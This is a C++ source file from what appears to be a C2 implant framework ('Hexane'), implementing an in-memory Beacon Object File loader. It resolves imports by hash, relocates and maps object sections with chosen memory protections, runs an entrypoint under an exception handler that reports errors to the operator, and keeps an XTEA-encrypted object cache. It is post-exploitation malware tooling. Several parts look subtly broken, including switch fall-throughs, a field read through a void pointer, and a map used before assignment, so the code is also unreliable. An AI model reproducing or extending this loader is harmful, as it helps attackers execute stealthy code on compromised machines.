#include <core/include/objects.hpp>

using namespace Hash;
using namespace Xtea;
using namespace Utils;
using namespace Opsec;
using namespace Stream;
using namespace Utils::Scanners;
using namespace Memory::Methods;

namespace Objects {

    // TODO: add common BOF/internal implant functions
    HASH_MAP RDATA internal_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    HASH_MAP RDATA bof_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    PVOID DATA wrapper_return = nullptr;
    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {

        _stream *stream = CreateTaskResponse(TypeError);

        exception->ContextRecord->IP_REG = U_PTR(wrapper_return);

        PackUint32(stream,   ERROR_UNHANDLED_EXCEPTION);
        PackUint32(stream,   exception->ExceptionRecord->ExceptionCode);
        PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));

        Dispatcher::MessageQueue(stream);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    VOID WrapperFunction(void *address, void *args, size_t size) {

        auto function = (OBJ_ENTRY) address;

        wrapper_return = __builtin_extract_return_addr(__builtin_return_address(0));
        function((char*)args, size);
    }

    BOOL ProcessSymbol(char* sym_string, void ** pointer) {

        char *function  = nullptr;

        *pointer = nullptr;
        // __imp_Beacon
        if (HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {

            function = sym_string + COFF_PREP_BEACON_SIZE;
            return MapScan(bof_map, HashStringA(function, MbsLength(function)), pointer);
        }
        // __imp_
        if (HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
            bool import = StringChar(sym_string, '$', MbsLength(sym_string));

            if (import) {
                char buffer[MAX_PATH] = { };

                auto count = 0;
                auto split = NewSplit(sym_string + COFF_PREP_SYMBOL_SIZE, "$", &count);
#ifdef _M_IX86
                Trim(split[1], '@');
#endif
                auto lib_hash   = HashStringA(MbsToLower(buffer, split[0]), MbsLength(split[0]));
                auto fn_hash    = HashStringA(MbsToLower(buffer, split[1]), MbsLength(split[1]));

                FreeSplit(split, count);
                C_PTR_HASHES(*pointer, lib_hash, fn_hash);

                return *pointer ? true : false;
            }

            function = sym_string + COFF_PREP_SYMBOL_SIZE;
            Trim(function, '@');

            return MapScan(internal_map, HashStringA(function, MbsLength(function)), pointer);
        }
        // .refptr.__instance
        if (HashStringA(sym_string, MbsLength(sym_string)) == COFF_INSTANCE) {

            *pointer = (_hexane*) C_DREF(GLOBAL_OFFSET);
            return *pointer ? true : false;
        }

        return false;
    }

    BOOL ExecuteFunction(_executable *image, const char *entry, void *args, const size_t size) {
        HEXANE;

        void *veh_handle = nullptr;
        void *entrypoint = nullptr;
        char *sym_name   = nullptr;

        bool success = false;
        const auto file_head = image->nt_head->FileHeader;

        // NOTE: register veh as execution safety net
        if (!(veh_handle = ctx->memapi.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
            goto defer;
        }

        // NOTE: set section memory attributes
        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
            const auto section  = ITER_SECTION_HEADER(image->buffer, sec_index);

            if (section->SizeOfRawData > 0) {
                uint32 protect = 0;

                switch (section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
                case PAGE_NOACCESS:         protect = PAGE_NOACCESS; break;
                case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE; break;
                case IMAGE_SCN_MEM_READ:    protect = PAGE_READONLY; break;
                case IMAGE_SCN_MEM_WRITE:   protect = PAGE_WRITECOPY; break;
                case IMAGE_SCN_MEM_RX:      protect = PAGE_EXECUTE_READ; break;
                case IMAGE_SCN_MEM_WX:      protect = PAGE_EXECUTE_WRITECOPY; break;
                case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE; break;
                case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE; break;
                default:
                    goto defer;
                }

                if ((section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                    protect |= PAGE_NOCACHE;
                }

                if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (void **) &image->sec_map[sec_index].address, &image->sec_map[sec_index].size, protect, nullptr))) {
                    goto defer;
                }
            }
        }

        if (image->fn_map->size) {
            if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (void **) &image->fn_map->address, &image->fn_map->size, PAGE_READONLY, nullptr))) {
                goto defer;
            }
        }

        // NOTE: get names from COFF symbol table and find entrypoint
        for (auto sym_index = 0; sym_index < file_head.NumberOfSymbols; sym_index++) {
            const auto symbols = image->symbols;

            if (symbols[sym_index].First.Value[0]) {
                sym_name = symbols[sym_index].First.Name; // inlined
            }
            else {
                sym_name = (char*)(symbols + file_head.NumberOfSymbols) + symbols[sym_index].First.Value[1]; // not inlined
            }

            // NOTE: compare symbols to entry names / entrypoint
            if (MemCompare(sym_name, entry, MbsLength(entry)) == 0) {
                entrypoint = image->sec_map[symbols[sym_index].SectionNumber - 1].address + symbols[sym_index].Value;

            }
        }

        // NOTE: find section where entrypoint can be found and assert is RX
        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
            if (entrypoint >= image->sec_map[sec_index].address && entrypoint < image->sec_map[sec_index].address + image->sec_map[sec_index].size) {

                const auto section = ITER_SECTION_HEADER(image->buffer, sec_index);

                if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE) {
                    goto defer;
                }
            }
        }

        WrapperFunction(entrypoint, args, size);
        success = true;

    defer:
        if (veh_handle) {
            ctx->memapi.RtlRemoveVectoredExceptionHandler(veh_handle);
        }

        return success;
    }

    BOOL BaseRelocation(_executable *image) {

        char sym_name[9]    = { };
        char *name_ptr      = nullptr;

        uint32 fn_count = 0;
        bool success = false;

        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            void *function = nullptr;

            const auto section  = ITER_SECTION_HEADER(image->buffer, sec_index);
            auto reloc = (RELOC *) U_PTR(image->buffer) + section->PointerToRelocations;

            for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
                const auto head = &image->symbols[reloc->SymbolTableIndex];

                if (head->First.Value[0]) {
                    MemSet(sym_name, 0, 9);
                    MemCopy(sym_name, head->First.Name, 8);
                    name_ptr = sym_name;
                }
                else {
                    name_ptr = (char*) (image->symbols + image->nt_head->FileHeader.NumberOfSymbols) + head->First.Value[1];
                }

                void *reloc_addr    = image->sec_map[sec_index].address + reloc->VirtualAddress;
                void *sec_addr      = image->sec_map[head->SectionNumber - 1].address;
                void *fn_addr       = image->fn_map + (fn_count * sizeof(void *));

                if (!ProcessSymbol(name_ptr, &function)) {
                    goto defer;
                }
#if _WIN64
                if (function) {
                    switch (reloc->Type) {
                        case IMAGE_REL_AMD64_REL32: {
                            *(void **) fn_addr       = function;
                            *(uint32 *) reloc_addr = U_PTR(fn_addr) - U_PTR(reloc_addr) - sizeof(uint32);
                        }
                        default:
                            break;

                    }
                }
                else {
                    switch (reloc->Type) {
                        case IMAGE_REL_AMD64_REL32:     *(uint32 *) reloc_addr = *(uint32 *) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32);
                        case IMAGE_REL_AMD64_REL32_1:   *(uint32 *) reloc_addr = *(uint32 *) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32) - 1;
                        case IMAGE_REL_AMD64_REL32_2:   *(uint32 *) reloc_addr = *(uint32 *) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32) - 2;
                        case IMAGE_REL_AMD64_REL32_3:   *(uint32 *) reloc_addr = *(uint32 *) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32) - 3;
                        case IMAGE_REL_AMD64_REL32_4:   *(uint32 *) reloc_addr = *(uint32 *) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32) - 4;
                        case IMAGE_REL_AMD64_REL32_5:   *(uint32 *) reloc_addr = *(uint32 *) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32) - 5;
                        case IMAGE_REL_AMD64_ADDR32NB:  *(uint32 *) reloc_addr = *(uint32 *) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32);
                        case IMAGE_REL_AMD64_ADDR64:    *(uint64 *) reloc_addr = *(uint64 *) reloc_addr + U_PTR(sec_addr);
                        default:
                            break;
                    }
                }
#else
                if (function) {
                    switch (reloc_addr->Type) {
                        case IMAGE_REL_I386_DIR32: {
                            *(void **) fn_addr       = function;
                            *(uint32 *) reloc_addr = U_PTR(fn_addr);
                        }
                        default:
                            break;
                    }
                }
                else {
                    switch (reloc_addr->Type) {
                        case IMAGE_REL_I386_DIR32: *(uint32 *)reloc_addr = (*(uint32 *)reloc_addr) + U_PTR(sec_addr);
                        case IMAGE_REL_I386_REL32: *(uint32 *)reloc_addr = (*(uint32 *)reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32);
                        default:
                            break;
                    }
                }
#endif
                reloc += sizeof(_reloc);
            }
        }

        success = true;

        defer:
        return success;
    }

    SIZE_T FindFunctionMapSize(_executable *image) {

        char sym_name[9]    = { };
        int counter         = 0;

        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section  = ITER_SECTION_HEADER(image->buffer, sec_index);
            auto reloc          = (RELOC *) U_PTR(image->buffer) + image->section->PointerToRelocations;

            for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
                const auto symbols  = image->symbols;
                char *buffer        = nullptr;

                if (_coff_symbol *symbol = &symbols[reloc->SymbolTableIndex]; symbol->First.Value[0]) {
                    MemSet(sym_name, 0, sizeof(sym_name));
                    MemCopy(sym_name, symbol->First.Name, 8);
                    buffer = sym_name;
                }
                else {
                    buffer = RVA(char*, symbols, image->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                }

                if (HashStringA(buffer, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                    counter++;
                }

                reloc = reloc + sizeof(_reloc);
            }
        }

        return sizeof(void*) * counter;
    }

    VOID AddCOFF(_coff_params *bof) {
        HEXANE;

        _coff_params *head = ctx->bof_cache;

        if (ENCRYPTED) {
            XteaCrypt((uint8 *) bof->data, bof->data_size, ctx->config.session_key, true);
            XteaCrypt((uint8 *) bof->args, bof->args_size, ctx->config.session_key, true);
            XteaCrypt((uint8 *) bof->entrypoint, bof->entrypoint_length, ctx->config.session_key, true);
        }

        if (!ctx->bof_cache) {
            ctx->bof_cache = bof;
        }
        else {
            do {
                if (head->next) {
                    head = head->next;
                }
                else {
                    head->next = bof;
                    break;
                }
            }
            while (true);
        }
    }

    COFF_PARAMS* FindCOFF(const uint32 bof_id) {
        HEXANE;

        auto head = ctx->bof_cache;
        // NOTE: coff_id will be a known name hash

        do {
            if (head) {
                if (head->bof_id == bof_id) {
                    if (ENCRYPTED) {
                        XteaCrypt((uint8 *)head->data, head->data_size, ctx->config.session_key, false);
                        XteaCrypt((uint8 *)head->args, head->args_size, ctx->config.session_key, false);
                        XteaCrypt((uint8 *)head->entrypoint, head->entrypoint_length, ctx->config.session_key, false);
                    }

                    return head;
                }

                head = head->next;
            }
            else {
                return nullptr;
            }
        }
        while (true);
    }

    VOID RemoveCOFF(const uint32 bof_id) {
        HEXANE;

        _coff_params *prev = { };

        if (!bof_id) {
            return;
        }

        for (auto head = ctx->bof_cache; head; head = head->next) {
            if (head->bof_id == bof_id) {

                if (prev) {
                    prev->next = head->next;
                }
                else {
                    ctx->bof_cache = head->next;
                }

                MemSet(head->data, 0, head->data_size);
                MemSet(head->args, 0, head->args_size);
                MemSet(head->entrypoint, 0, head->entrypoint_length);

                Free(head->data);
                Free(head->args);
                Free(head->entrypoint);
                Free(head);

                return;
            }

            prev = head;
        }
    }

    VOID Cleanup(_executable *image) {
        HEXANE;

        if (!image || !image->base) {
            return;
        }
        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (void **) &image->base, &image->size, PAGE_READWRITE, nullptr))) {
            // LOG ERROR
            return;
        }

        MemSet((void*) image->base, 0, image->size);

        uintptr_t pointer   = image->base;
        size_t size         = image->size;

        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), (void **) &pointer, &size, MEM_RELEASE))) {
            // LOG ERROR
            return;
        }

        if (image->sec_map) {
            ZeroFree(image->sec_map, image->nt_head->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
            image->sec_map = nullptr;
        }

        ZeroFree(image, sizeof(EXECUTABLE));
    }

    VOID COFFLoader(const char *entrypoint, void *data, void *args, const size_t args_size) {
        HEXANE;
        // NOTE: sec_map seems to be the only thing that persists

        EXECUTABLE *image   = CreateImage((uint8 *) data); ;
        auto next           = (uint8 *) image->base;
        bool success        = true;

        x_assertb(image->buffer    = (uint8 *) data);
        x_assertb(image->sec_map   = (OBJECT_MAP *) Malloc(sizeof(void*) * sizeof(OBJECT_MAP)));
        x_assertb(ImageCheckArch(image));

        image->fn_map->size = FindFunctionMapSize(image);
        image->size += image->fn_map->size;

        // NOTE: calculating address/size of sections before base relocation
        for (uint16_t sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section = ITER_SECTION_HEADER(image->buffer, sec_index);

            image->size += section->SizeOfRawData;
            image->size = (size_t) PAGE_ALIGN(image->size);
        }

        // NOTE: allocate space for sections
        x_ntassertb(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (void **) &image->base, image->size, &image->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

        for (uint16_t sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section = ITER_SECTION_HEADER(image->buffer, sec_index);

            // NOTE: every section will be assigned here before base relocation
            image->sec_map[sec_index].size     = section->SizeOfRawData;
            image->sec_map[sec_index].address  = next;

            next += image->section->SizeOfRawData;
            next = PAGE_ALIGN(next);

            MemCopy(image->sec_map[sec_index].address, RVA(PBYTE, image->buffer, image->section->SizeOfRawData), image->section->SizeOfRawData);
        }

        // NOTE: function map goes after the section map ?
        image->fn_map = (OBJECT_MAP *) next;

        x_assertb(BaseRelocation(image));
        x_assertb(ExecuteFunction(image, entrypoint, args, args_size));

    defer:
        if (success) {
            // LOG SUCCESS?
        }
        else {
            // LOG ERROR
        }

        if (image) {
            Cleanup(image);
        }
    }

    VOID COFFThread(_coff_params *coff) {

        if (!coff->entrypoint || !coff->data) {
            return;
        }

        COFFLoader(coff->entrypoint, coff->data, coff->args, coff->args_size);
    }
}
